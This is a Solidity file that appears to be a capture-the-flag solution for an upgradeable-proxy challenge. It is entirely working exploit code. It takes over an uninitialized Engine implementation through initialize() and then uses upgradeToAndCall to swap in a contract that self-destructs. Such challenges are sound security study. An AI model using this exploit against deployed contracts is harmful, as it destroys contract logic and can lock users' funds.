// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMotorbike {
    fallback() external payable;
}

interface IEngine {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract DestroyHelper {
    address public engine;

    constructor(address _engine) {
        engine = _engine;
    }

    function destroy() public {
        DestroyEngine destroyEngine = new DestroyEngine();

        IEngine engineInstance = IEngine(engine);
        engineInstance.initialize();
        engineInstance.upgradeToAndCall(address(destroyEngine), abi.encodeWithSignature("destroy!!!!"));
    }
}

contract DestroyEngine {
    fallback() external payable {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        selfdestruct(payable(msg.sender));
    }
}
